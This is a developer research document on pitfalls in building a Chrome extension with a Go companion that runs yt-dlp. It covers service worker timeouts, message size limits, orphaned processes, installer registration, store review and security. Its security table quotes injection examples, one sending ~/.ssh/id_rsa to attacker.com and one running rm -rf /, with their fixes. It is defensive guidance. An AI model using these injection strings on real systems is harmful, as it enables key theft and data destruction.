# Pitfalls Research: Chrome Extension + Go Native Companion (yt-dlp Download Utility)

> Research date: 2026-02-24
> Domain: Chrome Extension (Manifest V3) + Go native messaging host + yt-dlp

---

## Critical Pitfalls (Top 7)

### 1. MV3 Service Worker Kills Native Messaging Mid-Download

**What goes wrong:** The MV3 service worker terminates after 30 seconds of inactivity, closing the native messaging port. Chrome sends EOF to the native host's stdin, killing the Go companion process -- and with it, the in-progress yt-dlp download. The user sees a download that simply vanishes with no error.

**Why it happens:** In MV3, there is no persistent background page. The service worker lifecycle is aggressive: 30 seconds without an extension API call or event triggers termination. While `chrome.runtime.connectNative()` is documented to keep the service worker alive (Chrome 100+), this is **unreliable** in practice. GitHub issue #2688 on developer.chrome.com confirms that when `connect()` / `onConnectExternal()` are also in play, the service worker goes inactive after 5-6 minutes regardless. The native messaging port closure cascades: Chrome closes stdin pipe -> Go host detects EOF -> host exits -> yt-dlp child process becomes orphaned or killed.

**How to avoid:**
- Implement a keep-alive ping/pong on the native messaging port: the Go host sends a heartbeat message every 20 seconds, and the service worker replies. Each message resets the 30-second idle timer.
- As a belt-and-suspenders measure, call `chrome.storage.session.set()` with a timestamp every 25 seconds from the service worker while a download is active. Extension API calls independently reset the idle timer.
- In the Go host, treat stdin EOF as "connection lost, not cancelled" -- do not immediately kill yt-dlp. Instead, let it complete and write the result to a status file that the extension can query on reconnect.

**Warning signs:** Downloads that work for files under 30 seconds but fail on longer ones. Intermittent "Native host has exited" in `chrome://extensions` errors page. Downloads work in development (unpacked extensions have relaxed limits) but fail in production.

**Phase to address:** Architecture (Phase 1). This must be designed into the communication protocol from day one, not bolted on later.

---

### 2. Native Messaging 1 MB Response Limit Silently Drops Progress Updates

**What goes wrong:** The native messaging host sends a JSON message exceeding 1 MB to Chrome. Chrome silently disconnects the port -- no error event, no partial delivery. The extension sees `onDisconnect` fire with `chrome.runtime.lastError` set to "Native host has exited."

**Why it happens:** Chrome enforces a hard 1 MB (1,024 * 1,024 bytes) limit on messages FROM the native host TO the extension. The limit in the other direction is 4 GB. This asymmetry is poorly documented. The 1 MB is measured in bytes after JSON serialization and UTF-8 encoding, not string length -- multi-byte characters inflate the count. Common triggers:
- Sending a full yt-dlp `--dump-json` metadata blob (which can be 200KB-2MB+ for playlists)
- Accumulating progress updates into a single batch message
- Base64-encoding thumbnail data inline

**How to avoid:**
- Cap outbound messages at 750 KB (leaving margin for JSON wrapping overhead).
- For metadata: strip unnecessary fields before sending. Never send raw yt-dlp JSON to the extension without filtering.
- For large payloads: implement chunked transfer with sequence numbers. The Go host splits the payload into chunks, each tagged with `{chunk_id, total_chunks, data}`. The extension reassembles.
- Never send binary data (thumbnails, etc.) through native messaging. Write to disk and send the file path instead.

**Warning signs:** Extension works with short videos but breaks with playlists or videos that have long descriptions. Works on some sites but not others (metadata size varies by extractor).

**Phase to address:** Protocol Design (Phase 1). Message size limits must be a protocol-level concern.

---

### 3. yt-dlp Progress Output Buffering Defeats Real-Time Streaming

**What goes wrong:** The Go companion spawns yt-dlp and reads its stdout/stderr line by line to stream progress. But progress updates arrive in bursts (or all at once when yt-dlp finishes) instead of in real time. The user sees 0% for 30 seconds, then jumps to 100%.

**Why it happens:** When yt-dlp detects its stdout is not a TTY (which is always the case when spawned by Go's `os/exec`), the C runtime switches stdout to fully-buffered mode (typically 4KB or 8KB buffer). Progress lines like `[download]  45.2% of 150.3MiB at 5.2MiB/s ETA 00:14` are only ~60 bytes each, so dozens accumulate in the buffer before a flush. The `--newline` flag changes carriage returns to newlines but does NOT fix the buffering (GitHub issue #1215 confirms this). Additionally, `--progress-template postprocess:` does not respect `--newline` (GitHub issue #7193).

**How to avoid:**
- On Linux/macOS: wrap yt-dlp invocation with `stdbuf -oL` to force line-buffered stdout: `stdbuf -oL yt-dlp --newline ...`
- Alternatively, use a pseudo-TTY (pty) from Go. Libraries like `github.com/creack/pty` make yt-dlp think it's in a terminal, enabling real-time output. However, this adds ANSI escape codes that must be stripped.
- Use `--progress-template "download:%(progress._percent_str)s %(progress._speed_str)s %(progress._eta_str)s"` for clean, predictable output instead of parsing the default format.
- On Windows: `stdbuf` is not available. Use `--progress-template` with `--newline` and accept slightly delayed updates, or use a pty equivalent like ConPTY.
- Read from stderr (where progress goes by default) rather than stdout. Use `--quiet --progress` to get progress on stderr without other noise.

**Warning signs:** Progress works when you run yt-dlp manually in a terminal but not when your Go code spawns it. Progress appears to "jump" in large increments.

**Phase to address:** Implementation (Phase 2). But the architecture must account for the pty/stdbuf approach in the process spawning layer.

---

### 4. Zombie yt-dlp Processes After Cancelled or Failed Downloads

**What goes wrong:** The user cancels a download, or the native messaging port drops. The Go host exits, but the yt-dlp child process (and any ffmpeg subprocess it spawned for merging) keeps running. System resources accumulate. On Windows, yt-dlp.exe processes pile up in Task Manager. Eventually, file locks prevent new downloads to the same path.

**Why it happens:** Go's `cmd.Process.Kill()` only kills the direct child, not its descendants. yt-dlp spawns ffmpeg as a grandchild for format merging, and ffmpeg can spawn its own child processes. On Linux, the default behavior re-parents orphaned grandchildren to PID 1 (init). On Windows, there's no process group concept by default.

**How to avoid:**
- **Linux/macOS:** Set `cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}` before starting yt-dlp. This creates a new process group. To kill all descendants: `syscall.Kill(-cmd.Process.Pid, syscall.SIGTERM)` (note the negative PID).
- **Windows:** Use Job Objects. Create a Job Object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, assign the yt-dlp process to it. When the Go process exits or closes the job handle, all processes in the job are terminated. See `github.com/hallazzang` gist for a working Go implementation.
- Always send SIGTERM first, wait 5 seconds, then SIGKILL. yt-dlp handles SIGTERM by cleaning up partial files.
- Implement a process watchdog in the Go host that periodically checks if the native messaging port is still alive (stdin is readable). If stdin returns EOF, initiate graceful shutdown of all downloads.

**Warning signs:** Users report that cancelling a download doesn't actually stop it (bandwidth still consumed). Duplicate file errors on retry. Disk space consumed by invisible partial downloads.

**Phase to address:** Implementation (Phase 2), but process group strategy must be decided in Phase 1.

---

### 5. Cross-Platform Native Messaging Host Registration Failures

**What goes wrong:** The companion app installs fine, but Chrome says "Specified native messaging host not found" or "Access to the specified native messaging host is forbidden." The user reinstalls multiple times, checks FAQ, files a bug. 90% of support tickets for native messaging extensions are installation issues.

**Why it happens:** Native messaging host registration differs fundamentally across platforms:

| Platform | Manifest Location | Path Type | Extra Step |
|----------|------------------|-----------|------------|
| **Windows** | Anywhere (referenced by registry key) | Can be relative to manifest | Must create registry key at `HKCU\Software\Google\Chrome\NativeMessagingHosts\<name>` pointing to manifest JSON |
| **macOS** | `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/` (user) or `/Library/Google/Chrome/NativeMessagingHosts/` (system) | Must be absolute | File permissions must be correct (644 for manifest, 755 for binary) |
| **Linux** | `~/.config/google-chrome/NativeMessagingHosts/` (user) or `/etc/opt/chrome/native-messaging-hosts/` (system) | Must be absolute | Same permission requirements as macOS |

Common failure modes:
- **Extension ID mismatch:** The `allowed_origins` in the NMH manifest uses the development extension ID (`chrome-extension://abcdef...`), but the published extension has a different ID. These ALWAYS differ unless you pin the key.
- **Chromium vs Chrome paths:** Chromium uses different paths (`~/.config/chromium/...` instead of `~/.config/google-chrome/...`). Edge uses yet another path.
- **Windows registry bitness:** Chrome queries 32-bit registry first, then 64-bit. If the installer writes to the wrong hive, Chrome cannot find the manifest.
- **Relative path on macOS/Linux:** The `path` field in the NMH manifest must be absolute on macOS and Linux. A relative path works on Windows but silently fails elsewhere.
- **Symlinks:** Some package managers (Homebrew, Snap) install to non-standard paths with symlinks. The NMH manifest `path` must point to the real binary, not the symlink (on some OS versions).

**How to avoid:**
- Ship an installer/setup script per platform. Do not ask users to manually place files.
- Include a `--verify` flag in the Go companion that checks: (a) NMH manifest exists at the correct location, (b) `allowed_origins` contains the correct extension ID, (c) `path` field points to an executable that actually exists, (d) permissions are correct.
- Hard-code the published extension ID in the build pipeline and inject it into the NMH manifest at build time.
- Test on Chromium, Chrome, Edge, and Brave -- each has different NMH manifest paths.
- On Windows, write to HKCU (not HKLM) to avoid requiring admin privileges.

**Warning signs:** "Works on my machine." Installation works in development (unpacked extension, same ID) but fails after publishing. Works on Chrome but not Chromium/Edge.

**Phase to address:** Distribution/Packaging (Phase 3). But the extension ID pinning must happen in Phase 1.

---

### 6. yt-dlp Security Vulnerabilities via Untrusted Input (CVE-2024-22423)

**What goes wrong:** The extension passes a user-provided or website-derived URL to yt-dlp. An attacker crafts a URL or video title containing shell metacharacters or template expansion sequences. The Go host passes this to yt-dlp via `--exec` or output templates, resulting in arbitrary command execution on the user's machine.

**Why it happens:** CVE-2024-22423 (CVSS 7.3) demonstrated that `--exec` with `%q` on Windows allowed environment variable expansion even after the CVE-2023-40581 fix. All yt-dlp versions from 2021.04.11 to before 2024.04.09 were vulnerable. The root cause: `%` in filenames/titles is expanded by Windows cmd.exe when passed through `--exec`.

More broadly, yt-dlp output templates (`-o`, `--exec`, `--print`) interpolate fields from video metadata. If a video title contains `%(HOME)s` and you use `--exec "echo %(title)s"`, it expands environment variables on Windows.

**How to avoid:**
- **Never use `--exec` with user-controlled data.** Do all post-processing in Go, not in yt-dlp's `--exec`.
- **Pin yt-dlp to a minimum version** (>= 2024.04.09) and check version on startup.
- **Sanitize all input** before passing to yt-dlp: URLs, output paths, format selectors. Reject URLs containing shell metacharacters (`|`, `&`, `;`, `` ` ``, `$`, `(`, `)`).
- **Use `--` to separate flags from arguments:** `yt-dlp -- <url>` prevents URL from being interpreted as a flag.
- **Never construct yt-dlp command lines via string concatenation.** Use Go's `exec.Command(binary, args...)` which passes each argument separately, avoiding shell injection.
- **Run yt-dlp with minimal privileges.** Consider a dedicated user/sandbox.
- **Validate output filenames** returned by yt-dlp before using them in any further commands.

**Warning signs:** Any code path where user input (URL, format choice, filename) reaches a shell or `--exec` template without sanitization.

**Phase to address:** Architecture (Phase 1). Security boundaries must be defined before any code is written.

---

### 7. Chrome Web Store Rejection for Download Extensions

**What goes wrong:** The extension is built, tested, and submitted to the Chrome Web Store. It gets rejected with a vague policy violation notice. Common rejection reasons for download utilities:

1. **"Use of Permissions" violation:** Requesting `downloads`, `nativeMessaging`, `tabs`, and broad host permissions (`<all_urls>`) raises flags. 58% of 2024 rejections were compliance errors.
2. **"Single Purpose" violation:** If the extension both detects videos on pages AND manages downloads AND has settings, reviewers may claim it's not "single purpose."
3. **Missing privacy policy:** Extensions that interact with page content or use native messaging MUST have a privacy policy. 29% of listing denials cite unclear data practices.
4. **"Deceptive Installation Tactics":** If the extension landing page or description implies it downloads from specific copyrighted platforms (YouTube, Netflix), Google rejects proactively.
5. **Remote code execution concern:** `nativeMessaging` effectively delegates execution to an unreviewed binary. Google scrutinizes these extensions more heavily.

**How to avoid:**
- Request **minimal permissions**: Use `activeTab` instead of `<all_urls>` where possible. Request `nativeMessaging` and `downloads` only. Use optional permissions for anything else.
- Write the description generically: "Download media from supported sites" not "Download YouTube videos."
- Do not mention specific copyrighted platforms in screenshots or descriptions.
- Include a clear, specific privacy policy that explains: what data the extension collects (URLs passed to the companion app), what the companion app does, that no data is sent to remote servers.
- Justify every permission in the "Single Purpose" description: "All permissions serve the single purpose of downloading media that the user initiates."
- Respond to rejections with detailed explanations -- Google's review is often automated and human appeal succeeds if the extension is genuinely compliant.

**Warning signs:** Extension description mentions specific sites. Permissions list is longer than 4-5 items. No privacy policy URL in the manifest.

**Phase to address:** Planning (Phase 1) and Submission (Phase 4).

---

## Technical Debt Patterns

| Pattern | Symptom | Root Cause | Cost to Fix Later |
|---------|---------|------------|-------------------|
| Polling instead of event-driven progress | High CPU usage, battery drain on laptops | Started with `setInterval` polling from popup to service worker | High -- requires rewriting communication layer to use `chrome.runtime.onMessage` events |
| Monolithic native host message handler | Adding new features requires changing message parsing in 5+ places | No command/response protocol defined early | High -- every message type is a special case |
| Hardcoded yt-dlp path | Breaks when user updates yt-dlp or installs via different package manager | `exec.Command("/usr/local/bin/yt-dlp", ...)` | Medium -- need PATH lookup + config |
| Synchronous yt-dlp invocation | Only one download at a time, blocks native host | Used `cmd.Run()` instead of `cmd.Start()` + goroutine | Medium -- need download queue/manager |
| String-based progress parsing | Breaks on yt-dlp updates that change output format | Regex parsing of human-readable output | High -- must switch to `--progress-template` JSON |
| Global state in service worker | State lost on service worker restart; race conditions | Used module-level variables instead of `chrome.storage.session` | High -- must audit all state and externalize |
| No message correlation IDs | Cannot match responses to requests when multiple downloads run | Started with single-download assumption | High -- need request/response protocol redesign |

---

## Integration Gotchas

| Integration Point | Gotcha | Concrete Example | Fix |
|-------------------|--------|------------------|-----|
| yt-dlp + ffmpeg | ffmpeg binary must be a standalone executable, not the Python `ffmpeg` package from pip | `ERROR: You have requested merging of multiple formats but ffmpeg is not installed` even though `pip install ffmpeg` was run | Ship ffmpeg binary alongside yt-dlp or document that users need ffmpeg from ffmpeg.org, not pip |
| yt-dlp format selection | `bestvideo+bestaudio` requires ffmpeg to merge; `bestvideo,bestaudio` gives separate files | User picks "best quality" -> extension requests merge -> ffmpeg missing -> error | Detect ffmpeg presence before offering merge formats. Fall back to `best` (single file) if missing |
| yt-dlp + Go stderr/stdout | Progress goes to stderr by default; JSON metadata goes to stdout | Reading only stdout gives no progress; reading only stderr misses metadata | Capture both streams separately. Use `--print` for structured data on stdout, `--progress` for stderr |
| Native messaging + Windows | Go's `os.Stdin` on Windows defaults to text mode, which corrupts the 4-byte length prefix when it contains `0x0A` (newline) | Intermittent "Invalid message length" or "Message length too large" errors, only on Windows | On Windows, set stdin/stdout to binary mode at program start. In Go, this requires calling `_setmode` via syscall |
| Service worker + popup | Popup has its own JS context; closing popup destroys all state | User opens popup, sees download at 50%, closes popup, reopens -- shows 0% | Store download state in `chrome.storage.session`. Popup reads state on open. Service worker writes state on every progress update |
| yt-dlp + site authentication | Cookies from the browser are not automatically available to yt-dlp | User is logged into site in Chrome but yt-dlp gets "login required" error | Extract cookies using `--cookies-from-browser chrome` flag, or export cookies from extension and pass via `--cookies` file |
| Native messaging + Chromium variants | Each browser has its own NMH manifest directory | Extension installed in Brave, but NMH manifest only placed in Chrome's directory | Detect browser identity and install NMH manifest to all supported browser paths, or let users pick |

---

## Performance Traps

| Trap | Impact | Threshold | Mitigation |
|------|--------|-----------|------------|
| Sending every progress update through native messaging | Each message has ~0.5ms overhead for serialization + Chrome IPC. At 10 updates/sec, that is 5ms/sec of pure overhead on the main thread | > 5 updates/second causes visible UI jank | Throttle to 2-4 updates/second. Batch progress data. Only send when percentage changes by >= 1% |
| Storing download history in `chrome.storage.local` without cleanup | Storage grows unbounded. `chrome.storage.local.get(null)` becomes slow (>100ms) after thousands of entries | > 5000 history entries, or > 5 MB storage | Implement LRU eviction. Page history queries. Use IndexedDB for large datasets |
| Spawning a new yt-dlp process per format check | Each `yt-dlp --dump-json <url>` takes 2-5 seconds due to Python startup + network request | User clicks download button -> 3-5 second delay | Cache format info with URL as key. TTL of 5 minutes. Share format info between popup and service worker |
| Unbounded concurrent downloads | Each yt-dlp process uses 50-200 MB RAM. ffmpeg merging can spike to 500MB+ | > 3 concurrent downloads on a 8GB system | Implement download queue with configurable concurrency limit (default: 3) |
| Service worker re-initialization on every wake | Re-reading config from `chrome.storage`, re-establishing state on every 30-second wake cycle | Adds 50-100ms delay to every user interaction after idle | Cache config in `chrome.storage.session` (in-memory but survives restarts). Lazy-initialize only what's needed |
| JSON.parse on large yt-dlp metadata | Playlist metadata can be 2MB+. Parsing blocks the service worker's single thread | Playlist with 200+ videos -> 500ms+ parse time | Parse in the Go host. Send only needed fields (title, duration, thumbnail URL, formats) to the extension |

---

## Security Mistakes

| Mistake | Attack Vector | Severity | Mitigation |
|---------|--------------|----------|------------|
| Passing URLs to shell without sanitization | Crafted URL: `https://evil.com/$(curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa))` | **Critical** | Use `exec.Command()` with argument array, never `exec.Command("sh", "-c", ...)`. Validate URL scheme is http/https |
| Using `--exec` with video metadata | Video titled `'; rm -rf /; echo '` triggers shell injection via `--exec "mv %(title)s.mp4 final.mp4"` | **Critical** | Never use `--exec`. Do post-processing in Go code |
| Not validating NMH origin | Any extension with the host's name in `allowed_origins` can connect | **High** | The NMH manifest `allowed_origins` is the ONLY access control. Keep it limited to your exact extension ID. Verify on first message |
| Serving companion app updates over HTTP | MITM replaces the Go binary with malware | **Critical** | Sign binaries. Verify checksums. HTTPS-only update channel. Consider auto-update via OS package managers |
| Storing user cookies in plaintext | `--cookies-from-browser` extracts decrypted cookies. If written to a temp file, they persist on disk | **High** | Use `--cookies` with a file in a secure temp directory. Delete immediately after yt-dlp exits. Use OS-specific secure temp (`os.CreateTemp`) |
| Extension ID leaked in NMH manifest | Published NMH manifest reveals extension ID, enabling targeted attacks | **Low** | Not practically avoidable, but monitor for malicious extensions attempting to connect to your NMH |
| No yt-dlp version pinning | Old yt-dlp with known CVEs (CVE-2024-22423, CVE-2023-40581) remains in use | **High** | Check yt-dlp version on startup. Warn user if below minimum safe version (2024.04.09). Block execution if critically vulnerable |

---

## UX Pitfalls

| Pitfall | User Experience | Technical Cause | Solution |
|---------|----------------|-----------------|----------|
| "Install companion app" with no guidance | User installs extension, clicks download, gets cryptic "Native host not found" error | Native messaging requires separate installation that the Chrome Web Store cannot automate | In-extension onboarding flow: detect missing companion, show platform-specific install instructions with copy-paste commands, verify installation with a test message |
| Progress bar stuck at 0% | User clicks download, nothing appears to happen for 5-30 seconds while yt-dlp extracts info | Format extraction happens before download starts; no feedback is given | Show distinct states: "Extracting video info..." -> "Starting download..." -> progress bar. Send pre-download status messages from Go host |
| Download "completes" but file is broken | User gets a file that won't play, or is audio-only when video was expected | ffmpeg merge failed silently, or yt-dlp fell back to a different format without reporting | Validate output file after download: check file size > 0, verify container format. Report actual downloaded format back to user |
| Popup closes, progress lost | User accidentally clicks outside popup or switches tabs; reopens popup to see no progress | Popup is a separate browsing context; its state is destroyed on close | Use `chrome.storage.session` for active download state. Popup polls/subscribes on open. Consider side panel API instead of popup for persistent UI |
| No way to find downloaded files | Download completes but user does not know where the file went | Default download path is OS-specific and not shown | After download, show a clickable "Open file" / "Show in folder" link using `chrome.downloads.show()` |
| Multiple quality options confuse users | yt-dlp reports 15+ formats; user has no idea what "137 - 1920x1080 (mp4)" means | Raw yt-dlp format list is not user-friendly | Curate format options: "Best Quality (1080p)", "Good Quality (720p)", "Audio Only (MP3)". Map to yt-dlp format strings internally |
| Extension button does nothing on unsupported sites | User clicks extension icon on a site yt-dlp doesn't support; nothing happens | No feedback for unsupported sites | Check URL against known supported sites. Show "This site is not supported" state. Offer "Try anyway" option |

---

## "Looks Done But Isn't" Checklist

- [ ] **Tested on all three platforms (Windows, macOS, Linux)?** NMH registration is completely different per platform. Testing on one means nothing for the others.
- [ ] **Tested with the Chrome Web Store version (packed), not just unpacked?** Extension IDs differ. NMH `allowed_origins` must match the published ID. Service worker timeouts are more relaxed for unpacked extensions.
- [ ] **Tested after Chrome restarts?** Service worker state is lost. Does the extension recover gracefully?
- [ ] **Tested with yt-dlp not installed?** Error message should guide user to install yt-dlp, not show a stack trace.
- [ ] **Tested with ffmpeg not installed?** Audio extraction and format merging fail. The extension should detect this and adjust available options.
- [ ] **Tested with a download > 5 minutes?** This exceeds multiple timeout boundaries (service worker, potentially the native messaging keepalive).
- [ ] **Tested cancellation during ffmpeg merge phase?** yt-dlp spawns ffmpeg as a child. Killing yt-dlp may not kill ffmpeg.
- [ ] **Tested with concurrent downloads?** Message correlation, progress routing, resource limits.
- [ ] **Tested with yt-dlp version mismatch?** What happens if user has yt-dlp 2023.x? Do `--progress-template` flags work? Do format strings parse correctly?
- [ ] **Tested popup close/reopen during download?** Does progress resume? Does the download list persist?
- [ ] **Tested with restrictive antivirus (Windows Defender, etc.)?** Native messaging hosts are flagged as suspicious by some AV. The Go binary may be quarantined.
- [ ] **Tested with non-ASCII file paths?** yt-dlp output paths with Unicode characters, CJK filenames, emoji in titles.
- [ ] **Tested with proxy/VPN?** yt-dlp may need proxy settings that differ from Chrome's.
- [ ] **Tested `chrome.runtime.lastError` after every async Chrome API call?** Unchecked errors cause silent failures and "Unchecked runtime.lastError" console warnings that can trigger Web Store rejection.
- [ ] **Tested that the service worker re-registers all event listeners synchronously at the top level?** Async listener registration is the #1 MV3 migration bug. If listeners are registered inside `async` functions or after `await`, they will be missed when the service worker restarts.

---

## Recovery Strategies

| Failure Mode | Detection | Recovery | User-Facing Message |
|-------------|-----------|----------|---------------------|
| Native host not found | `chrome.runtime.lastError` contains "Specified native messaging host not found" | Show installation wizard. Offer to run diagnostic command | "Companion app not detected. Click here to install." |
| Native host crash (exit code != 0) | `onDisconnect` fires with error | Log last known state. Offer retry. Check if binary exists and is executable | "Download interrupted. Retrying..." |
| Service worker restart during download | Service worker `activate` event fires; active downloads array is empty | Read download state from `chrome.storage.session`. Reconnect to native host. Query Go host for active download status | (Transparent to user if recovery succeeds) |
| yt-dlp version too old | Parse `yt-dlp --version` output on startup. Compare against minimum version | Show update instructions. Block downloads if CVE-affected version detected | "yt-dlp version X.Y is outdated. Please update for security and compatibility." |
| yt-dlp extraction failure | Exit code 1 + stderr contains "ERROR:" | Parse error category (geo-blocked, login required, unsupported URL). Show specific guidance | "This video requires login" / "This site is not supported" / "Video is geo-blocked" |
| ffmpeg missing | stderr contains "ffmpeg is not installed" or "ffmpeg not found" | Fall back to single-stream formats. Hide merge-dependent quality options | "Audio/video merging unavailable. Install ffmpeg for best quality options." |
| Disk full | yt-dlp exit code 1 + "No space left on device" in stderr | Abort download. Clean up partial files | "Not enough disk space. Need approximately X MB free." |
| NMH manifest `allowed_origins` mismatch | `chrome.runtime.lastError` contains "Access to the specified native messaging host is forbidden" | This is a build/packaging bug, not a runtime error. Cannot auto-recover | "Companion app configuration error. Please reinstall the companion app." |
| Port disconnected during download | `onDisconnect` event on the native messaging port | Attempt reconnection (re-call `connectNative()`). If successful, query host for download status | (Transparent if reconnection succeeds within 2 seconds) |

---

## Pitfall-to-Phase Mapping

| Phase | Critical Pitfalls | Action Items |
|-------|-------------------|-------------|
| **Phase 1: Architecture & Design** | #1 (Service Worker Lifecycle), #2 (Message Size Limits), #6 (Security), #7 (Web Store Policy) | Define message protocol with size limits, correlation IDs, and chunking. Design keepalive mechanism. Define security boundaries. Plan permission model for Web Store compliance |
| **Phase 2: Core Implementation** | #3 (Progress Buffering), #4 (Zombie Processes) | Implement pty/stdbuf for progress streaming. Implement process group management. Build download queue with concurrency limits |
| **Phase 3: Cross-Platform & Packaging** | #5 (NMH Registration) | Build per-platform installers. Implement `--verify` diagnostic. Test on Chrome, Chromium, Edge, Brave across all 3 OS |
| **Phase 4: Polish & Submission** | #7 (Web Store Rejection) | Audit permissions. Write privacy policy. Prepare Web Store listing. Test packed extension with published ID |
| **Phase 5: Maintenance** | #6 (yt-dlp CVEs), #3 (yt-dlp output changes) | Version checking. Update monitoring. Automated testing against new yt-dlp releases |

---

## Sources

### High Confidence (Official Documentation, Confirmed Bugs)
- [Chrome Native Messaging Documentation](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) -- Official Chrome docs on NMH protocol, message limits, manifest format
- [Chrome Extension Service Worker Lifecycle](https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle) -- Official docs on 30-second timeout, keepalive mechanisms
- [Chrome Service Worker Longer Lifetimes Blog Post](https://developer.chrome.com/blog/longer-esw-lifetimes) -- Chrome 116+ improvements for WebSocket/native messaging keepalive
- [CVE-2024-22423 (NVD)](https://nvd.nist.gov/vuln/detail/cve-2024-22423) -- yt-dlp command injection via `--exec` on Windows
- [yt-dlp GitHub Issue #4262](https://github.com/yt-dlp/yt-dlp/issues/4262) -- Error code documentation request (confirms lack of structured error reporting)
- [yt-dlp GitHub Issue #1215](https://github.com/yt-dlp/yt-dlp/issues/1215) -- Progress buffering when not running from terminal
- [yt-dlp GitHub Issue #7193](https://github.com/yt-dlp/yt-dlp/issues/7193) -- `--progress-template postprocess` ignores `--newline`
- [yt-dlp GitHub Issue #3330](https://github.com/yt-dlp/yt-dlp/issues/3330) -- `--newline` fails with external downloaders
- [yt-dlp GitHub Issue #12829](https://github.com/yt-dlp/yt-dlp/issues/12829) -- yt-dlp tries to merge without ffmpeg
- [Chrome Alarms API](https://developer.chrome.com/docs/extensions/reference/api/alarms) -- 30-second minimum interval (Chrome 120+)
- [Chrome Offscreen Documents API](https://developer.chrome.com/docs/extensions/reference/api/offscreen) -- Single instance limit, API restrictions
- [Chrome Web Store Troubleshooting Violations](https://developer.chrome.com/docs/webstore/troubleshooting) -- Official rejection reason guide
- [Chrome Web Store Program Policies](https://developer.chrome.com/docs/webstore/program-policies/policies) -- Use of Permissions, Single Purpose requirements

### Medium Confidence (Community Issues, Developer Blogs, Confirmed by Multiple Sources)
- [developer.chrome.com Issue #2688](https://github.com/GoogleChrome/developer.chrome.com/issues/2688) -- "Native messaging port keeps service worker alive" claim is unreliable with `connect()`/`onConnectExternal()`
- [anthropics/claude-code Issue #16350](https://github.com/anthropics/claude-code/issues/16350) -- Native host dies when service worker goes idle (real-world confirmation)
- [w3c/webextensions Issue #72](https://github.com/w3c/webextensions/issues/72) -- Use cases not well served by service workers
- [w3c/webextensions Issue #256](https://github.com/w3c/webextensions/issues/256) -- Native messaging connection from service worker challenges
- [Chromium Bug 1152255](https://issues.chromium.org/issues/40733525) -- Service worker shutdown every 5 minutes
- [browserpass/browserpass-native NMH Registration](https://deepwiki.com/browserpass/browserpass-native/5.3-native-messaging-host-registration) -- Cross-platform NMH registration reference implementation
- [Killing child processes in Go (sigmoid.at)](https://sigmoid.at/post/2023/08/kill_process_descendants_golang/) -- Process group kill technique
- [Killing child process and all children in Go (Medium)](https://medium.com/@felixge/killing-a-child-process-and-all-of-its-children-in-go-54079af94773) -- Setpgid approach
- [Windows Job Objects for Go (GitHub Gist)](https://gist.github.com/hallazzang/76f3970bfc949831808bbebc8ca15209) -- Windows process group equivalent
- [go-ytdlp Go Package](https://pkg.go.dev/github.com/lrstanley/go-ytdlp) -- Go wrapper for yt-dlp (reference implementation)
- [WebSocket in MV3 Service Workers (Chrome Docs)](https://developer.chrome.com/docs/extensions/how-to/web-platform/websockets) -- 20-second heartbeat recommendation
- [Chrome Extension MV3 Service Worker Timeout Mitigation (Medium)](https://medium.com/@bhuvan.gandhi/chrome-extension-v3-mitigate-service-worker-timeout-issue-in-the-easiest-way-fccc01877abd) -- Practical keepalive patterns
- [Pushing Native Messaging to the Limits (dev.to)](https://dev.to/totally_chase/pushing-native-messaging-to-the-limits-c-vs-rust-4nad) -- Message size and throughput benchmarks

### Lower Confidence (Anecdotal, Single-Source, Older)
- [Extension Radar Blog: 15 Rejection Reasons](https://www.extensionradar.com/blog/chrome-extension-rejected) -- Web Store rejection statistics (percentages may be approximate)
- [Chrome Web Store Rejection Codes (Medium)](https://medium.com/@bajajdilip48/chrome-web-store-rejection-codes-b71f817ceaea) -- Community-compiled rejection code reference
- [Native Messaging as Bridge (Medium)](https://medium.com/fme-developer-stories/native-messaging-as-bridge-between-web-and-desktop-d288ea28cfd7) -- Cross-platform NMH setup walkthrough
- [Go os.Stdin pipe reading hangs on Windows (golang/go#22024)](https://github.com/golang/go/issues/22024) -- Stdin pipe behavior differences on Windows
- [eyeo's Journey Testing MV3 Service Worker Suspension (Chrome Blog)](https://developer.chrome.com/blog/eyeos-journey-to-testing-mv3-service%20worker-suspension) -- Testing methodology for service worker suspension
